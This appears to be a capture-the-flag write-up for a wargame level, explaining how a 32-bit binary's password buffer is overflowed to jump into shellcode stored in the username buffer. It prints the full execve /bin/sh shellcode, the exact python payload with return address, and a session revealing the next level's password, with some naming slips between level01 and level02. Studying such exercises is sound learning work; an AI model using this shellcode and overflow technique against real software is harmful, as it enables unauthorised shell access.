We get the binary out of the Vm using this cmd:

scp -P 4242 level02@192.168.56.103:./level02 ./test2

Then we decompile it with ghidra, and we get this pseudo code in c.
We clear it up from useless variable and understand it by testing the binary with gdb.

Te program ask for us to input a username in a 256 char buffer. 

--> fgets(a_user_name,256,stdin);

The content of this buffer is later checked with the function 'verify_user_name()'
The verify_user_name function will check if the first 7 char of our buffer is equal to "dat_wil" and return the result of this comparison.

Then the program ask us to input a password, wich will be stored in a 16 char buffer.

--> undefined4 local_54 [16];

--> fgets(local_54,100,stdin);

We will use the Nopsled buffer overflow to exploit the weekness of the first buffer (large buffer, verification only for the first 7 char)
For this exploit, we need a shellcode wich will launch us a shell (/bin/sh)

let's do it ! To generate it, let's create a shellcode.nasm
```s
xor     eax, eax    ;Clearing eax register
push    eax         ;Pushing NULL bytes
push    0x68732f2f  ;Pushing //sh
push    0x6e69622f  ;Pushing /bin
mov     ebx, esp    ;ebx now has address of /bin//sh
push    eax         ;Pushing NULL byte
mov     edx, esp    ;edx now has address of NULL byte
push    ebx         ;Pushing address of /bin//sh
mov     ecx, esp    ;ecx now has address of address
                    ;of /bin//sh byte
mov     al, 11      ;syscall number of execve is 11
int     0x80        ;Make the system call
```
compile it
* `nasm -f elf shellcode.asm`

Use objdump to get the shellcode bytes:
* `objdump -d -M intel shellcode.o`

Extracting the bytes gives us the shellcode
* `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`

Now we have a shellcode, we need the address of the first buffer, a quick look on ghidra, it is 0x0804a040.

And the offset of the segfault in the second buffer. To find it we use the dichotomy method.
* `python -c "print 'dat_wil' + '\n' + 'a' * 80 > /tmp/file`
* `cat /tmp/file - | ./level1`

We found the segfault at 80. The method we'll use for this exploit is called a nopsled overflow.

We'll first input dat_wil to pass the verify_user_name function and then our payload followed by '\n' to enter the input a continue the program.

then for the second input, we'll print 80 times 'a' to reach the segfault and add the address of the first buffer + 7 (to skip the 'dat_will').

This way the next instruction to be executed will be our shellcode.

To resume:
`dat_wil + shellcode + '\n' + a * 80 + addr_of_buffer1 + 7` 

et voila !

Now let's build our payload:

`python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x47\xa0\x04\x08'" > /tmp/file`

```s
level01@OverRide:~$ cat /tmp/file - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv

```